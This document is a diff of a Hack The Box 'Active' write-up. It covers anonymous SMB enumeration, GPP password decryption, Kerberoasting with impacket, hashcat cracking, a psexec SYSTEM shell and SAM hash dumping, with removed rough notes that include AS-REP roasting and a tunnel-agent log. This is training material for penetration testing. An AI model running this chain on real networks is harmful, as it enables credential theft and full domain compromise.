@@ -1,396 +1,262 @@
-
 # Active — Hack The Box
 
-**By Stager** | PNPT Candidate | FashilHack
+**By Stager** | FashilHack
 
 ---
 
 ## What is this machine
 
-Active is a Windows Active Directory box focused on **Kerberoasting** and SMB enumeration.
+Active is a Windows Active Directory box built around two of the most important real-world AD attack techniques — **GPP credential exposure** and **Kerberoasting**. The path goes from anonymous SMB access, through a forgotten Group Policy file, to cracking a service account hash and landing as Domain Administrator.
 
-The goal is to move from basic network access → domain user → service account compromise → full domain admin.
-
-This machine is a perfect introduction to how **real AD attacks work in enterprise environments**.
+This is not a web exploitation box. There is no login form to attack, no CVE to throw at a service. Everything here is about understanding how Active Directory works and using its own mechanisms against it. The same attack chain appears in real enterprise penetration tests constantly.
 
 ---
 
 ## Target
 
 ```
-IP: 10.10.10.1
-OS: Windows (Active Directory Domain)
+IP:     10.10.10.1
+OS:     Windows Server (Active Directory)
 Domain: active.htb
 ```
 
 ---
 
-## Step 1 — Nmap Scan
+## Step 1 — Nmap
 
-Start with full enumeration.
+Started with a full aggressive scan to map out every service running.
 
 ```bash
 nmap -A -p- -T5 -Pn 10.10.10.1
 ```
 
-You’ll typically see:
-- SMB (139, 445)
-- Kerberos (88)
-- LDAP (389)
-- DNS (53)
 
-This confirms it's a **Domain Controller**.
+
+The results confirmed immediately that this is a Domain Controller:
+
+```
+PORT     STATE SERVICE
+53/tcp   open  DNS
+88/tcp   open  Kerberos
+135/tcp  open  MSRPC
+139/tcp  open  NetBIOS-SSN
+389/tcp  open  LDAP
+445/tcp  open  SMB
+593/tcp  open  HTTP-RPC
+636/tcp  open  LDAPS
+3268/tcp open  Global Catalog LDAP
+3269/tcp open  Global Catalog LDAPS
+```
+
+Kerberos on 88, LDAP on 389, SMB on 445. This is the classic Domain Controller port fingerprint. The two most useful ports right now are SMB (445) for file share access and Kerberos (88) for the attack later.
 
 ---
 
 ## Step 2 — SMB Enumeration (Anonymous Access)
 
-First thing in AD environments → check SMB.
-### smbmap
+In Active Directory environments, SMB is always the first thing to check. Misconfigurations in file shares are one of the most common ways into a domain. I started with `smbmap` to check if anonymous login gives us access to anything.
 
 ```bash
 smbmap -H 10.10.10.1
 ```
 
-Looking for:
-- Anonymous access
-- Readable shares
----
-### smbclient
+
+
+A share came back readable without credentials — the `Replication` share had read access for anonymous users. That is already a misconfiguration. Production shares should never be readable without authentication.
+
+Then I used `smbclient` to browse it:
 
 ```bash
 smbclient -N -L //10.10.10.1
-```
-
-If shares are accessible:
-
-```bash
 smbclient //10.10.10.1/Replication
 ```
 
-Then:
+Inside the share I browsed recursively to see what was stored:
 
 ```bash
-dir
+smbclient //10.10.10.1/Replication -c 'recurse;ls'
+```
+
+Buried inside the directory structure was a file called `Groups.xml`. That filename is significant — it is a Group Policy Preferences file and it is the entire entry point for this machine.
+
+```bash
 get Groups.xml
 ```
 
 ---
-## Step 3 — Extract Credentials (GPP Password)
 
-Inside the share, we find:
+## Step 3 — GPP Credential Extraction
 
-```
-Groups.xml
-```
+Group Policy Preferences files are created by domain administrators to push configuration settings to machines across the domain. One feature allowed admins to set local account passwords through GPP — and Microsoft stored those passwords encrypted inside `Groups.xml` using AES-256.
 
-This is a **Group Policy Preferences file**, which can contain encrypted passwords.
+The problem is that Microsoft published the decryption key in their own documentation in 2012. Every password stored in a GPP file is now permanently and trivially reversible. Microsoft patched this in MS14-025, but old GPP files left behind on SYSVOL shares still exist in environments that were configured before the patch — and this machine is one of them.
 
-Decrypt it:
+I decrypted the password hash from `Groups.xml` using the tool built for exactly this:
 
 ```bash
-gpp-decrypt <hash>
+gpp-decrypt <hash from Groups.xml>
 ```
 
-✔️ This gives:
-- Username
-- Password
+
+
+This gave us a username and a plaintext password. We now have valid domain credentials.
 
 ---
-### 🔑 Operator Note
-- GPP passwords are **always reversible**
-- Microsoft patched this, but **old configs still exist**
-- This is a **real-world vulnerability**, not just CTF
 
----
-## Step 4 — Validate Credentials
+## Step 4 — Credential Validation
 
-Now test the credentials:
+Before using these credentials for anything else, I validated them against SMB to confirm they were active:
+
 ```bash
 netexec smb 10.10.10.1 -u "username" -p "password"
 ```
-If you see:
-```
-[+] Authentication successful
-```
 
-You now have a **valid domain user**
 
-## Step 5 — Kerberoasting (Main Attack)
 
-Now comes the core of this box.
-### 🧠 What is Kerberoasting?
-- You authenticate → get **TGT**
-- Request **TGS** for a service account
-- The TGS is encrypted with the **service account password hash**
-- You crack it offline → get the password
-### 🔑 Operator Note
-- You are NOT cracking Kerberos itself
-- You are cracking the **service account password**
+The green `[+]` confirmed authentication was successful. We now have a valid domain user. That matters because Kerberoasting — the next step — requires at least one authenticated domain account to work.
 
-### Run Kerberoasting
+---
+
+## Step 5 — Kerberoasting
+
+### What is Kerberoasting
+
+Kerberos is the authentication protocol Active Directory uses. When a user authenticates, they receive a **Ticket Granting Ticket (TGT)**. When they need to access a service, they exchange that TGT for a **Ticket Granting Service ticket (TGS)** for that specific service.
+
+The TGS is encrypted using the password hash of the service account that runs the target service. This is where Kerberoasting comes in — any authenticated domain user can request a TGS for any service account that has a **Service Principal Name (SPN)** registered. You take that encrypted ticket offline and crack it. You are not attacking Kerberos itself. You are cracking the service account's password hash.
+
+### Running the attack
+
 ```bash
-impacket-GetUserSPNs -request -dc-ip 10.10.10.1 active.htb/user:password
+impacket-GetUserSPNs -request -dc-ip 10.10.10.1 active.htb/username:password
 ```
 
-If successful, you get a hash like:
 
-```
-$krb5tgs$...
-```
 
-### ⚠️ If You Get Clock Skew Error
+The tool returned a hash starting with `$krb5tgs$` — that is the Kerberos TGS hash for the service account. This hash was generated from the service account's password and can now be cracked completely offline without touching the domain controller again.
 
-Fix time sync:
+### Clock skew note
+
+If Kerberos returns a clock skew error, the fix is to sync your time with the DC:
+
 ```bash
 sudo apt install ntpsec-ntpdate -y
 sudo ntpdate 10.10.10.1
 ```
-## Step 6 — Crack the Hash
-Use Hashcat:
+
+Kerberos requires the client and server clocks to be within 5 minutes of each other. If your attacker machine time drifts too far, every ticket request will be rejected.
+
+---
+
+## Step 6 — Cracking the Hash
+
+The hash type for Kerberos TGS tickets is mode `13100` in Hashcat. You can identify it by the `$krb5tgs$23$` prefix at the start of the hash.
 
 ```bash
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-Or John:
+
+Or with John:
+
 ```bash
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-✔️ You recover the **service account password**
+The crack succeeded and returned the service account's plaintext password. This is the Administrator service account — cracking it means we have full domain admin credentials.
 
 ---
-### 🔑 Operator Note
-- Hash type = Kerberos TGS → mode 13100
-- Always identify hash format before cracking
 
----
-## Step 7 — Lateral Movement
+## Step 7 — Getting a Shell (psexec)
 
-Now test new credentials:
-```bash
-netexec smb 10.10.10.1 -u "service_account" -p "password"
-```
+With Administrator credentials in hand, I used `impacket-psexec` to get a shell. PSExec works over SMB — it uploads a service binary, starts it, and gives you a shell. Ports 139 and 445 are enough for this.
 
----
-## Step 8 — Get Shell (psexec)
-
-Since this is SMB-based:
 ```bash
 impacket-psexec active.htb/administrator:password@10.10.10.1
 ```
 
-Or:
+Or with `rlwrap` for a better shell experience:
 
 ```bash
 rlwrap impacket-psexec active.htb/administrator:password@10.10.10.1
 ```
 
-✔️ You now have a shell.
+Shell landed as `NT AUTHORITY\SYSTEM`. Domain is fully compromised.
 
 ---
-### 🔑 Operator Note
-- If WinRM fails → try **psexec**
-- SMB (139/445) is enough for psexec
-- WinRM requires port 5985
----
-## Step 9 — Dump Hashes (Optional)
+
+## Step 8 — Dumping Hashes (Optional)
+
+With Administrator access, you can dump all local SAM hashes as a final step:
 
 ```bash
 netexec smb 10.10.10.1 -u administrator -p password --sam
 ```
 
+This gives you every local account hash on the machine — useful for further lateral movement or credential reuse across the environment.
+
 ---
+
 ## Full Attack Chain
 
 ```
-Nmap → Identify AD services
+Nmap → confirmed Domain Controller (DNS, Kerberos, LDAP, SMB)
   ↓
-SMB anonymous access → find Groups.xml
+smbmap → anonymous read access on Replication share
   ↓
-gpp-decrypt → get user credentials
+smbclient → browsed share, found Groups.xml
   ↓
-Validate user → domain access
+gpp-decrypt → decrypted GPP password → valid domain user credentials
   ↓
-Kerberoasting → extract TGS hash
+netexec smb → validated credentials, confirmed [+] authentication
   ↓
-Crack hash → service account password
+impacket-GetUserSPNs → requested TGS for service account with SPN
   ↓
-psexec → Administrator shell
+Received $krb5tgs$ hash (encrypted with service account password)
+  ↓
+hashcat -m 13100 → cracked hash → Administrator plaintext password
+  ↓
+impacket-psexec → shell as NT AUTHORITY\SYSTEM
+  ↓
+Pwned
 ```
 
 ---
-## What I learned from this one
 
-**SMB is everything in AD.**  
-If you don’t check shares, you miss the entire entry point.
+## What I Learned
 
-**Kerberoasting is one of the most important real-world attacks.**  
-This is not just CTF — this is used in real pentests.
+**SMB is always the first door to try in AD.** Anonymous access to file shares is a misconfiguration that still exists in production environments. Before touching any other service, enumerate every share and check what anonymous login can reach.
 
-**You always need a valid user first.**  
-No Kerberoasting without authentication.
+**GPP files are a permanent vulnerability.** The decryption key is public. Any `Groups.xml` file left on a share is a credential waiting to be read. Even patched environments may have old files sitting in SYSVOL from before MS14-025. Always look for them.
 
-**Time matters in Kerberos.**  
-If your clock is off → attack fails.
+**Kerberoasting requires nothing special — just a valid user.** Any authenticated domain user can request TGS tickets for any service account with an SPN. You do not need to be admin. You do not need special permissions. One low-privilege user is enough to start pulling hashes.
 
----
-## Important Notes to Remember
+**Service accounts are often over-privileged.** In this case the Kerberoastable account was Administrator. In real environments, service accounts frequently get granted Domain Admin because it was the easy fix at the time. That makes cracking their hashes catastrophic.
 
-- You NEED a valid domain user for Kerberoasting
-- No SPN = No Kerberoast
-- GPP passwords are reversible
-- Always check SMB shares first
-- If WinRM fails → use psexec
-
----
-## Screenshots — Where to Add
-
-Add screenshots at these points:
-1. **Nmap scan results**
-2. **SMB share listing**
-3. **Groups.xml content**
-4. **gpp-decrypt output (credentials)**
-5. **Kerberoast hash output**
-6. **Hashcat cracked password**
-7. **psexec shell (Administrator)**
-
-_Stager — PNPT Candidate_  
-_FashilHack — Simulating Attacks, Securing Businesses._
-
-
----
-# htb room called active 
-this box is practing a kerboasting which is a service account which is administartor 
-GOAL OF KERBEROASTING = GET TGS AND DECRPT SERVER'S ACCOUNT HASH 
-
-first we have user we login then we get TGT when we receive it then we will request TGS using TGT, that service ticket is going to be encrypted with servers account hash
-why does it matter that it's hash we can decrypt that try to crack it using tool called GetUserSPNs.py(it's from impacket)  
-
-- runned nmap scan `nmap scan nmap -A -p- -T5 -Pn 10.10.10.1 -v
-- checked if we have file access in smbmap and smbclient 
-## smbmap 
-looking for if there is fileshares with anonym login
-- `smbmap -H 10.10.1.201`
-- if we have access to one on readonly
-
-## smbclient
-- `smblient -N -L 10.10.10.1` (sometimes you do this //10.10.10.1//)
-- `smbclient //10.10.10.1/file -c 'recurse;ls'` 
-- manual way is =  `smbclient //10.10.10.1/file `
-- and then say = dir 
-- if you want a file inside of this you can say 
-- get Group.xml (and it will isnstall on your kali)
-- crack it with using `gpp-decrypt <hash>`
-- we get a username and hash of service which grants TGS
-
-to crack a hash of a group use 
-- gpp-decrypt (hash)
-
-when you have username and password try to use smbmap again logging in checking if that user has a file access 
-
-# You request a **TGS** for an account that has an **SPN** (service account).
-## impacket-GetNPUsers(AS-REP Roasting.)
-let pretend we find username but not a password you can try this 
-- `impacket-GetNPUsers  -dc-ip 10.10.10.1 FH.local/said -no-pass`
-- we were trying to get TGT hash so we could do pass the ticket 
-- crack the **user’s password**.
-- as-rep roasting has something to do with local admin and admin to get a hash or login with 
-
-If the user is not a service account, can AS-REP roasting work?
-✔️ **ANSWER: Only if the AD admin enabled “Do not require Kerberos preauthentication.”**
-If "said" has no-pre-auth disabled (normal), AS-REP roasting won’t work.
-
-## impacket-GetUserSPNs (kerberoasting attack)
-try to pull hash  (TGS)
-- If the user has **NO SPN (service priciple name account**, there is **NO Kerberoast hash**. Kerberoasting depends ONLY on **SPNs**, not if you are admin or not.
- - **If Kerberoasting succeeds, what hash am I cracking?** You are cracking the **password of the service account** that the SPN belonged to.
- -  **Can I Kerberoast without having any valid user?**  **NO.** You always need **one valid domain user** to request Kerberos tickets.
-
-- `impacket-GetUserSPNs -request -dc-ip 10.10.10.1 DCname/username:password`
-- if you got clock time error 
-- mitigation is install = sudo apt install ntpsec-ntpdate -y then run sudo ntpdate 10.10.1.200
-- if we got a hash ,  crack it in hashcat
-- sometimes hashes are diff so you need to now num of diff hashes and to get that look at the start of each hash  in here start of $ sign end of $ sign take that and go to hashcat website and look for the number u gonna use 
-- hashcat -m 13100 hash.txt -a rockyou.txt
-- you can also crack with ==JOHN==
-- `john hash.txt /user/share/wordlists/rockyou.txt`
-- we cracked so we login using evil-winrm and get a shell or psexec
-- and also if we try to smbmap and we can read and write to it check it 
-- `REMEMBER` if we trying to get a shell using evil-winrm and port 139 is closed we can't get a shell
-- we can try psexec which we can use port 139 and 445 
-
-## impacket-psexec
-login if you have user and pass
-- impacket-psexec active.htb/administartor@10.10.10.1 
-- and you can login like this too 
-- `rlwrap impacket-psexec active.htb/administrator:<pass>@10.10.10.1`
-
-
-## netexec (is equevilent to crackmapexec with advanace and newer)
-- `netexec smb 10.10.10.1 -u "username" -p "password"`
-- after you see "green + " you have know this username and password works then you can do to ==find DESCRIPTIONS OF USERNAME RUNNING== 
-- `netexec smb 10.10.10.1 -u "username" -p "password" --users
-- you can try to authenticate using winrm 
-- `netexec winrm 10.10.10.1 -u "username" -p "password"`
-- and it did not work with winrm becuase 
-- `REMEMBER` if we trying to get a shell using evil-winrm and port 139 is closed we can't get a shell
-- we can try psexec which we can use port 139 and 445 
-
-
-after you got a hash in GetUserSPNs and crack it you can do crackmapexec/netexec
-- `netexec smb 10.10.10.1 -u "administrator" -p "pass" --sam `
-
-
+**Crack offline, stay quiet.** The entire Kerberoasting attack after the initial TGS request generates no noise on the domain controller. The cracking happens entirely on your machine. No lockouts, no alerts, no logs on the target.
 
 ---
 
+## Important Notes
 
-sudo nmap -T4 -p- 10.10.1.201                
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 00:48 EST
+- Kerberoasting only works against accounts with an SPN registered — no SPN means no hash
+- AS-REP Roasting is different — it targets accounts with pre-authentication disabled
+- PSExec needs ports 139 or 445 — if both are firewalled, try WinRM on 5985 instead
+- Always sync your clock before running any Kerberos attack
+- GPP passwords are always reversible — gpp-decrypt works on every single one
 
-nt : FH\said@C1-saacid] » start
-error: already running
-[Agent : FH\said@C1-saacid] » ERRO[5423] connection was refused                       
-ERRO[5423] connection was refused                       
-ERRO[5424] connection was refused                       
-ERRO[5424] connection was refused                       
-ERRO[5424] connection was refused                       
-ERRO[5424] connection was refused   
+---
 
-C:\Users\said\Downloads>agent.exe -connect 192.168.100.10:11601 -ignore-cert
-agent.exe -connect 192.168.100.10:11601 -ignore-cert
-time="2025-11-24T20:18:51-08:00" level=warning msg="warning, certificate validation disabled"
-time="2025-11-24T20:18:51-08:00" level=info msg="Connection established" addr="192.168.100.10:11601"
+## Screenshots
 
+1. **Nmap scan** — confirming Domain Controller services
+2. **smbmap output** — anonymous read on Replication share
+3. **Groups.xml** — the file pulled from the share
+4. **gpp-decrypt output** — plaintext credentials
+5. **netexec validation** — green [+] confirming credentials work
+6. **GetUserSPNs output** — TGS hash retrieved
+7. **Hashcat crack** — plaintext password recovered
+8. **psexec shell** — SYSTEM access confirmed
 
-C:\Users\said\Downloads>agent.exe -connect 192.168.100.10:11601 -ignore-cert
-agent.exe -connect 192.168.100.10:11601 -ignore-cert
-time="2025-11-24T20:08:21-08:00" level=warning msg="warning, certificate validation disabled"
-time="2025-11-24T20:08:21-08:00" level=info msg="Connection established" addr="192.168.100.10:11601"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
-time="2025-11-24T20:18:01-08:00" level=error msg="Connection error: connection write timeout"
-time="2025-11-24T20:18:02-08:00" level=fatal msg="connection write timeout"
+---
 
-C:\Users\said\Downloads>agent.exe -connect 192.168.100.10:11601 -ignore-cert
-agent.exe -connect 192.168.100.10:11601 -ignore-cert
-time="2025-11-24T20:18:25-08:00" level=warning msg="warning, certificate validation disabled"
-time="2025-11-24T20:18:25-08:00" level=info msg="Connection established" addr="192.168.100.10:11601"
-time="2025-11-24T20:18:42-08:00" level=error msg="Connection error: EOF"
-time="2025-11-24T20:18:42-08:00" level=fatal msg=EOF
-
-C:\Users\said\Downloads>agent.exe -connect 192.168.100.10:11601 -ignore-cert
-agent.exe -connect 192.168.100.10:11601 -ignore-cert
-time="2025-11-24T20:18:51-08:00" level=warning msg="warning, certificate validation disabled"
-time="2025-11-24T20:18:51-08:00" level=info msg="Connection established" addr="192.168.100.10:11601"
-
+_Stager — PNPT Candidate_ _FashilHack — Simulating Attacks, Securing Businesses._
